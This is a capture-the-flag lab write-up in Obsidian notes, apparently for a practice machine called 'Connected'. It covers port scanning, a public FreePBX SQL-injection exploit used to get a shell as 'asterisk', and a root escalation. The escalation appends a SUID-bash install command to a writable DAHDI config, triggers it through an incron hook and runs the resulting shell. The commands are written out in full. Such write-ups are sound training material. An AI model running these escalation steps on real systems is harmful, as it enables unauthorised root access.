> Obsidian Notes
- Starting with nmap to scan which services is running.

```bash
nmap -sC -sV -T4 -A -Pn 10.129.245.100
```
![[Pasted image 20261124133341.png|700]]
## Nmap Enumeration

### Open Ports
- 22/tcp - SSH (OpenSSH 7.4)
- 80/tcp - HTTP (Apache 2.4.6, PHP 7.4.16)
- 443/tcp - HTTPS (Apache 2.4.6, PHP 7.4.16)
### Web Enumeration
- HTTP title: 404 Not Found
- Requested resource: config.php
- robots.txt: 1 disallowed entry
- SSL Certificate CN: pbxconnect
### OS Detection
- Likely Linux
- OS fingerprint is inconclusive


- Then we add the IP at /etc/hosts
```bash
echo '10.129.245.100 connected.htb' | sudo tee -a /etc/hosts
```
 - Lets connect
![[Pasted image 20261124135024.png]]

## Vulnerability Research

### Identified Software
- Software: FreePBX
- Version: 16.0.40.7
- Endpoint: /admin/config.php
### Potential Vulnerability
- Exploit-DB: EDB-52681
- CVE: CVE-2025-57819
- Vulnerability: Unauthenticated SQL Injection
- Potential impact: Remote Code Execution (RCE)
### Attack Chain
1. Identify vulnerable FreePBX version
2. SQL injection in Endpoint Manager
3. Manipulate database via injection
4. Create scheduled job
5. Achieve code execution
### References
- https://www.exploit-db.com/exploits/52681

Setup listener and runned the script. After ~60s we got access.

![[Pasted image 20261124141545.png]]
### Shell Information 
- Target: Connected
- IP: 10.129.245.100
- User: asterisk
- Shell: Bash
- Access: Initial foothold
# Connected — User Enumeration

## Current User
- **User:** asterisk
- **Hostname:** connected
- **UID:** 999
- **GID:** 1000
- **Groups:** asterisk

### User Flag

Located at:

```bash
/home/cat.txt
```

**User Flag captured** 

## Privilege Escalation to Root

### Enumeration

Check the incron configuration:

```bash
cat /etc/incron.d/*
```

![[Pasted image 20261124172529.png]]

Discovered an incron rule triggering:

```text
/usr/bin/sysadmin_manager $#
```
### Analyze `sysadmin_manager`

```bash
ls -l /usr/bin/sysadmin_manager
strings /usr/bin/sysadmin_manager | head -100
```
![[Pasted image 20261124172950.png]]

- Owned by root
- PHP script
- Handles Sysadmin hooks
- Uses incron to trigger actions when files change
### DAHDI Configuration
Check file permissions:

```bash
ls -l /etc/dahdi/init.conf
```

![[Pasted image 20261124173036.png]]
The file was writable by asterisk
### Root Escalation

Append a command to the writable DAHDI configuration:

```bash
printf '\n install -m 4755 /bin/bash /tmp/pwn1 \n' >> /etc/dahdi/init.conf
````

Trigger the DAHDI restart hook:

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
````

Verify the SUID binary:
```bash
ls -l /tmp/pwn1
````

The binary was created with SUID permissions and owned by root:

```bash
-rwsr-x 1 root root 964536 /tmp/pwn1
````

Execute the binary and obtain a root shell:
```bash
/tmp/pwn1 -p 
whoami
````

![[Pasted image 20261124174000.png]]
### Root Flag

Located at:

```bash
/root/root.txt
```

**Root Flag captured** 
